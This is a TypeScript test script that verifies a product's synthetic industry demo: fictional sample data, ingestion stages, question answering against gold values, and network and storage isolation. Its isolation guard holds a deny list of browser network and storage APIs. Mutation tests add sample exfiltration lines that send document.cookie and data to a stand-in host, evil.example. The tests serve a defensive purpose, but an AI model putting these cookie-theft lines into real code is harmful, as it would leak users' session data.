/**
 * Demo mode checks (VITE_DEEPWELL_DEMO): the industry demo page at /demo/ and its synthetic sample workspaces.
 *   1. every industry in the picker has a workspace that loads, with the agreed first five in order
 *   2. the sample data is plainly fictional (invented names, 555-01xx phones, example.com e-mail) and marked synthetic
 *   3. ingestion: every document goes Uploaded -> Reading pages -> Fields found -> Matched, and the dashboard adds up
 *   4. Donovan: every suggested question, asked of the real reader (api/_lib/dql/reader-v2) over that industry's records, gives the
 *      answer the demo shows, and that answer holds the gold value worked out from the records; the "did you mean" example offers the right name
 *   5. isolation: the demo page uses no sign-in, API, store or database code; api/ still has 12 top-level files; the page is built only with the switch on
 *   npm run verify:industry-demo                       all industries
 *   npx tsx scripts/verify-industry-demo.ts --only realty,electrical   some industries (step 4 is the slow one)
 *   npx tsx scripts/verify-industry-demo.ts --skip-reader              steps 1-3 and 5 only
 * Needs no network, no key, no model call.
 */
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { askDemo, dashboardOf, demoFlagOn, ingestPlan, nearName, stagesAfter, INGEST_STAGES, type DemoFixture, type DemoIndex } from '../src/demo/engine';
// @ts-expect-error plain JS module
import { SURNAMES, FIRST, PLACES, STREETS, goldMatches, polish } from './demo/demoData.mjs';
// @ts-expect-error plain JS module
import { CORE } from './demo/industries.mjs';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const FX = path.join(ROOT, 'src', 'demo', 'fixtures'); const REC = path.join(ROOT, 'scripts', 'fixtures', 'industry-demo');
const argv = process.argv.slice(2); const argOf = (k: string) => { const i = argv.indexOf('--' + k); return i >= 0 ? argv[i + 1] : undefined; };
const only = argOf('only')?.split(','); const skipReader = argv.includes('--skip-reader');
let passed = 0; const failures: string[] = [];
const ok = (c: unknown, name: string) => { if (c) passed++; else failures.push(name); };

/* ---------------------------------------------------------------- 1. index + fixtures */
const index = JSON.parse(fs.readFileSync(path.join(FX, 'index.json'), 'utf8')) as DemoIndex;
const coreSlugs = (CORE as Array<{ slug: string }>).map((c) => c.slug);
ok(JSON.stringify(index.industries.slice(0, 5).map((i) => i.slug)) === JSON.stringify(coreSlugs), 'picker starts with realty, property management, plumbing & HVAC, electrical, general contractor');
ok(index.industries.filter((i) => i.core).length === 5, 'exactly five featured industries');
ok(new Set(index.industries.map((i) => i.slug)).size === index.industries.length, 'industry slugs are unique');
const list = index.industries.filter((i) => !only || only.includes(i.slug));
const fixtures: DemoFixture[] = [];
for (const i of list) {
  const f = path.join(FX, `${i.slug}.demo.json`); const r = path.join(REC, `${i.slug}.records.json`);
  ok(fs.existsSync(f) && fs.existsSync(r), `[${i.slug}] workspace and records files exist`);
  if (!fs.existsSync(f)) continue;
  const fx = JSON.parse(fs.readFileSync(f, 'utf8')) as DemoFixture; fixtures.push(fx);
  const t = `[${i.slug}]`;
  ok(fx.slug === i.slug && fx.label === i.label && fx.company === i.company, `${t} index entry matches the workspace`);
  ok(fx.synthetic === true, `${t} marked synthetic`);
  ok(fx.documents.length >= 12 && fx.documents.length <= 30, `${t} 12-30 sample documents (${fx.documents.length})`);
  ok(new Set(fx.documents.map((d) => d.typeLabel)).size >= 4, `${t} at least 4 kinds of document`);
  ok(fx.questions.length >= 4 && fx.questions.length <= 8, `${t} 4-8 suggested questions (${fx.questions.length})`);
  ok(new Set(fx.questions.map((q) => q.q.toLowerCase())).size === fx.questions.length, `${t} suggested questions are distinct`);
  ok(!!fx.didYouMean, `${t} has a "did you mean" example`);
  const ids = new Set(fx.documents.map((d) => d.id));
  for (const q of fx.questions) for (const id of q.answer.docs) ok(ids.has(id), `${t} "${q.q}" cites a document in the workspace`);
  for (const d of fx.documents) ok(d.pages.length >= 1 && d.pages.every((p) => p.trim().length > 20), `${t} ${d.name} has page text`);

  /* ------------------------------------------------------------ 2. plainly fictional */
  const surn = new Set(SURNAMES as string[]), first = new Set(FIRST as string[]);
  const isPerson = (n: string) => { const w = n.split(' '); return w.length === 2 && first.has(w[0]!) && surn.has(w[1]!); };
  const isOrg = (n: string) => (PLACES as string[]).some((p) => n.startsWith(p + ' '));
  ok(fx.customers.every((c) => isPerson(c.name) || isOrg(c.name)), `${t} every ${fx.customerNoun} name is from the invented lists`);
  ok(fx.staff.every(isPerson), `${t} every staff name is from the invented list`);
  ok((PLACES as string[]).some((p) => fx.company.startsWith(p)), `${t} company name is invented (${fx.company})`);
  ok(fx.customers.every((c) => /@([a-z0-9-]+\.)*example\.com$/.test(c.email) && /\(480\) 555-01\d\d$/.test(c.phone)), `${t} e-mail at example.com, phones 555-01xx`);
  ok(fx.customers.every((c) => (STREETS as string[]).some((s) => c.address.includes(s))), `${t} street names are invented`);
  const named = new Set([...fx.customers.map((c) => c.name), ...fx.staff]);
  const lines = fx.documents.flatMap((d) => d.pages.join('\n').split('\n')).map((l) => /^(?:[A-Z][a-z ]+): (.+)$/.exec(l)).filter(Boolean).map((m) => m![1]!);
  const partyLines = fx.documents.flatMap((d) => d.pages.join('\n').split('\n').filter((l) => new RegExp(`^${fx.customerNoun}: `, 'i').test(l)).map((l) => l.replace(/^[^:]+: /, '')));
  ok(partyLines.every((n) => named.has(n)), `${t} every party named on a document is a demo ${fx.customerNoun}`);
  ok(lines.length > 0, `${t} documents carry labelled fields`);

  /* ------------------------------------------------------------ 3. ingestion + dashboard */
  const plan = ingestPlan(fx);
  ok(plan.length === fx.documents.length * INGEST_STAGES.length, `${t} every document gets all ${INGEST_STAGES.length} processing steps`);
  ok(stagesAfter(fx, 0).size === 0, `${t} nothing is processed before the upload starts`);
  const all = stagesAfter(fx, plan.length); ok(fx.documents.every((d) => all.get(d.id) === 'Matched'), `${t} after the upload every document is matched`);
  const half = stagesAfter(fx, Math.floor(plan.length / 2)); ok(half.size > 0 && [...half.values()].some((s) => s !== 'Matched'), `${t} processing is visible part-way`);
  const dash = dashboardOf(fx);
  ok(dash.documents === fx.documents.length && dash.byType.reduce((s, x) => s + x.count, 0) === fx.documents.length, `${t} dashboard counts every document once`);
  ok(dash.customers >= 3 && dash.recent.length > 0, `${t} dashboard shows customers and recent documents`);
  const billed = fx.documents.filter((d) => d.billable).reduce((s, d) => s + (d.total ?? 0), 0);   // the bills only (contracts, quotes and receipts are not billed); the full money check is verify:demo-financials
  ok(Math.abs(dash.billed - billed) < 0.005 && dash.openBalance <= dash.billed + 0.005, `${t} billed and open balance add up`);

  /* ------------------------------------------------------------ demo ask logic */
  for (const q of fx.questions) { const r = askDemo(fx, q.q); ok(r.kind === 'answer' && r.question.id === q.id, `${t} "${q.q}" finds its own answer`); }
  for (const q of fx.questions) { const r = askDemo(fx, q.q.toLowerCase().replace(/\?$/, '')); ok(r.kind === 'answer' && r.question.id === q.id, `${t} lower-case, no question mark: "${q.q}"`); }
  if (fx.didYouMean) {
    const dy = fx.didYouMean; const n = nearName(fx, dy.q); const base = fx.questions.find((q) => q.id === dy.answerOf);
    ok(n?.suggestion === dy.suggestion && n?.corrected === dy.corrected, `${t} misspelled "${dy.typed}" is offered back as ${dy.suggestion}`);
    ok(!!base && base.q === dy.corrected, `${t} the corrected question is a suggested question`);
    const r = askDemo(fx, dy.q); ok(r.kind === 'did-you-mean', `${t} asking with the misspelled name shows "Did you mean"`);
    const r2 = askDemo(fx, dy.corrected); ok(r2.kind === 'answer' && r2.question.id === dy.answerOf, `${t} tapping the suggestion answers it`);
  }
  ok(askDemo(fx, 'what is the weather tomorrow').kind === 'try-suggested', `${t} an unrelated question points to the suggestions`);
  ok(fx.questions.every((q) => nearName(fx, q.q) === null), `${t} no suggested question is mistaken for a misspelling`);
}

/* ---------------------------------------------------------------- 4. the real reader answers every suggested question */
if (!skipReader && fixtures.length) {
  const { loadReaderV2, buildIndex } = await import('../api/_lib/dql/reader-v2/index.js' as string);
  const { decide } = await import('../api/_lib/dql/reader-v2/pipeline.js' as string);
  const R = await loadReaderV2(); const log = console.log;
  for (const fx of fixtures) {
    const records = JSON.parse(fs.readFileSync(path.join(REC, `${fx.slug}.records.json`), 'utf8'));
    ok(records.tenantName === fx.company && records.documents.length === fx.documents.length, `[${fx.slug}] records match the workspace`);
    const ix = buildIndex(records, 'demo-' + fx.slug); const types = [...new Set(records.documents.map((d: { document_type: string }) => d.document_type))];
    const gold = (fx as unknown as { gold: Record<string, unknown> }).gold;
    for (const q of fx.questions) {
      console.log = () => {}; let g: { answered: boolean; text: string; docs: string[] };
      try { g = await decide(ix, q.q, R.M); } finally { console.log = log; }
      ok(g.answered, `[${fx.slug}] Donovan answers "${q.q}"`);
      ok(polish(g.text, types) === q.answer.text, `[${fx.slug}] "${q.q}" gives the answer the demo shows`);
      ok(goldMatches(gold[q.id], g.text, g.docs), `[${fx.slug}] "${q.q}" is correct against the records`);
    }
  }
}

/* ---------------------------------------------------------------- 5. isolation + switch */
ok(demoFlagOn({ VITE_DEEPWELL_DEMO: 'true' }) && !demoFlagOn({}) && !demoFlagOn({ VITE_DEEPWELL_DEMO: 'false' }) && !demoFlagOn({ VITE_DEEPWELL_DEMO: true }) && !demoFlagOn(undefined), 'switch is on only for the exact string "true"');
// "Try your own documents" (tryown.ts + TryOwn.tsx) is the one deliberate exception, and a NARROW one. Every other demo file keeps the original, full rule.
const TRYOWN_FILES = new Set(['tryown.ts', 'TryOwn.tsx']);
const demoSrc = fs.readdirSync(path.join(ROOT, 'src', 'demo')).filter((f) => /\.(ts|tsx)$/.test(f) && !TRYOWN_FILES.has(f)).map((f) => fs.readFileSync(path.join(ROOT, 'src', 'demo', f), 'utf8')).join('\n');
const strictDemoViolations = (src: string): boolean => /from ['"](?:\.\.\/)+(?:services|store|hooks)\//.test(src) || /@clerk\//.test(src) || /\bfetch\(/.test(src) || /['"`]\/api\//.test(src);
const strictStorageViolations = (src: string): boolean => /localStorage|sessionStorage|indexedDB/.test(src);
ok(!strictDemoViolations(demoSrc), 'demo page uses no sign-in, API, store or data-sync code');
ok(!strictStorageViolations(demoSrc), 'demo page saves nothing in the browser');

/** Every network call in the try-own files, spelled out. Anything else (another fetch, XHR, beacon, socket, another URL, another method) is a violation. */
const ALLOWED_CALLS = [
  "fetcher(ENDPOINT, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ op, ...body }) })",
  'fetcher(`${ENDPOINT}&op=status`)',
  "fetcher(uploads[i]!.url, { method: 'PUT', body: f })",
];
const callsOf = (src: string, name: string): string[] => {
  const out: string[] = [];
  const re = new RegExp(`(?<![\\w.$])${name}\\s*\\(`, 'g');
  for (let m = re.exec(src); m; m = re.exec(src)) {
    let depth = 0, k = m.index + m[0].length - 1;
    for (; k < src.length; k++) { const c = src[k]; if (c === '(') depth++; else if (c === ')' && --depth === 0) break; }
    out.push(src.slice(m.index, k + 1).replace(/\s+/g, ' '));
  }
  return out;
};
/** @returns the list of rule breaks in one try-own file (empty = clean) */
export function tryownViolations(file: string, src: string): string[] {
  const v: string[] = [];
  const bare = src.replace(/\/\*[\s\S]*?\*\/|(^|[^:])\/\/.*$/gm, '$1'); // comments are not code
  if (/\bfetch\s*\(/.test(bare)) v.push('direct fetch( call');
  for (const word of ['XMLHttpRequest', 'sendBeacon', 'WebSocket', 'EventSource', 'document.cookie', 'localStorage', 'indexedDB', 'eval(', 'new Function', 'importScripts', 'window.open', 'postMessage', 'navigator.', 'import(', 'Worker(']) if (bare.includes(word)) v.push(`forbidden: ${word}`);
  if (/@clerk\/|from ['"](?:\.\.\/)+(?:services|store|hooks)\//.test(bare)) v.push('sign-in / store / data-sync import');
  for (const m of bare.matchAll(/from\s+['"]([^'"]+)['"]/g)) if (!['react', 'lucide-react', './tryown'].includes(m[1]!)) v.push(`import from ${m[1]}`);
  for (const m of bare.matchAll(/(['"`])((?:(?!\1)[^\\\n]|\\.)*)\1/g)) { // string literals that look like a destination
    const lit = m[2]!;
    if (/^(?:https?:)?\/\//i.test(lit) || /\/api\//.test(lit)) { if (lit !== '/api/account?action=demo-try') v.push(`URL literal ${lit.slice(0, 50)}`); }
  }
  if (file === 'TryOwn.tsx') { if (/\bfetcher\b|\bfetch\b/.test(bare.replace(/fetchStatus/g, ''))) v.push('network access outside tryown.ts'); }
  else {
    const calls = callsOf(bare, 'fetcher');
    for (const c of calls) if (!ALLOWED_CALLS.includes(c)) v.push(`network call not on the allow-list: ${c.slice(0, 90)}`);
    for (const a of ALLOWED_CALLS) if (!calls.includes(a)) v.push(`allow-listed call missing: ${a.slice(0, 50)}`);
    if (!/const ENDPOINT = '\/api\/account\?action=demo-try';/.test(bare)) v.push('ENDPOINT is not exactly /api/account?action=demo-try');
    if (!/const uploads = p\.uploads as Array<\{ url: string \}>;/.test(bare)) v.push('upload URLs do not come from the presign response');
    if ((bare.match(/ENDPOINT/g) ?? []).length !== 3) v.push('ENDPOINT used somewhere unexpected');
    const ss = [...bare.matchAll(/sessionStorage/g)].length;
    if (ss !== 2 || !/storage: Pick<Storage, 'getItem' \| 'setItem'> \| null = typeof sessionStorage === 'undefined' \? null : sessionStorage/.test(bare)) v.push('sessionStorage used other than as the session-id default');
    for (const m of bare.matchAll(/\.setItem\(([^,)]*)/g)) if (m[1]!.trim() !== 'SID_KEY') v.push('setItem of something other than the session id');
    for (const m of bare.matchAll(/\.getItem\(([^)]*)/g)) if (m[1]!.trim() !== 'SID_KEY') v.push('getItem of something other than the session id');
  }
  return v;
}
for (const f of TRYOWN_FILES) { const vs = tryownViolations(f, fs.readFileSync(path.join(ROOT, 'src', 'demo', f), 'utf8')); ok(vs.length === 0, `try-your-own file ${f}: only the allow-listed endpoint calls, no other network or storage use${vs.length ? ' [' + vs.join('; ') + ']' : ''}`); }
{
  // the guard must actually bite: each of these edits to the real files has to be caught
  const real = fs.readFileSync(path.join(ROOT, 'src', 'demo', 'tryown.ts'), 'utf8');
  const realUi = fs.readFileSync(path.join(ROOT, 'src', 'demo', 'TryOwn.tsx'), 'utf8');
  const bad: Array<[string, string, string]> = [
    ['an evil fetch', 'tryown.ts', real + '\nfetch("https://evil.example/x?"+document.cookie);'],
    ['a second fetcher call to another URL', 'tryown.ts', real + '\nvoid fetcher("https://evil.example/steal", { method: "POST", body: "x" });'],
    ['a fetcher call to the demo endpoint with a different method', 'tryown.ts', real.replace("method: 'PUT'", "method: 'DELETE'")],
    ['the endpoint pointed elsewhere', 'tryown.ts', real.replace("'/api/account?action=demo-try'", "'/api/v1?action=export'")],
    ['sendBeacon', 'tryown.ts', real + '\nnavigator.sendBeacon("/x", "y");'],
    ['a WebSocket', 'tryown.ts', real + '\nnew WebSocket("wss://evil.example");'],
    ['XMLHttpRequest', 'tryown.ts', real + '\nnew XMLHttpRequest();'],
    ['reading other storage', 'tryown.ts', real + '\nvoid sessionStorage.getItem("other");'],
    ['storing the document text', 'tryown.ts', real.replace('storage.setItem(SID_KEY, sid);', 'storage.setItem("doc", JSON.stringify(sid));')],
    ['the upload URL taken from elsewhere', 'tryown.ts', real.replace('const uploads = p.uploads as Array<{ url: string }>;', 'const uploads = [{ url: "https://evil.example" }] as Array<{ url: string }>;')],
    ['a fetch in the panel', 'TryOwn.tsx', realUi + '\nvoid fetch("/api/anything");'],
    ['a new import in the panel', 'TryOwn.tsx', realUi.replace("from 'react';", "from 'react';\nimport axios from 'axios';")],
  ];
  for (const [name, file, src] of bad) ok(tryownViolations(file, src).length > 0, `gate catches: ${name}`);
  // and every OTHER demo file stays under the original full rule
  ok(strictDemoViolations('fetch("/x")') && strictDemoViolations("const u = '/api/account?action=demo-try'") && strictStorageViolations('sessionStorage.getItem("a")'), 'every other demo file is still held to the original rule (no fetch, no /api/, no storage), even for the demo-try endpoint');
}
const appSrc = (dir: string): string[] => fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) => e.isDirectory() ? (e.name === 'demo' ? [] : appSrc(path.join(dir, e.name))) : /\.(ts|tsx)$/.test(e.name) ? [path.join(dir, e.name)] : []);
ok(appSrc(path.join(ROOT, 'src')).every((f) => !/demo\/fixtures|from ['"][./]*demo\//.test(fs.readFileSync(f, 'utf8'))), 'the signed-in app never imports the demo workspaces');
const apiTop = fs.readdirSync(path.join(ROOT, 'api'), { withFileTypes: true }).filter((e) => e.isFile());
ok(apiTop.length === 12, `api/ has 12 top-level files (${apiTop.length})`);
const vite = fs.readFileSync(path.join(ROOT, 'vite.config.ts'), 'utf8');
ok(/VITE_DEEPWELL_DEMO[\s\S]{0,120}=== 'true'[\s\S]{0,90}demo\/index\.html/.test(vite), 'the /demo/ page is built only when VITE_DEEPWELL_DEMO is "true"');
ok(/\/src\/demo\/main\.tsx/.test(fs.readFileSync(path.join(ROOT, 'demo', 'index.html'), 'utf8')), 'demo/index.html loads the demo page');

console.log(`verify:industry-demo  ${passed} passed, ${failures.length} failed  (${fixtures.length} industries${skipReader ? ', reader step skipped' : ''})`);
for (const f of failures.slice(0, 40)) console.log('  FAIL ' + f);
process.exit(failures.length ? 1 : 0);
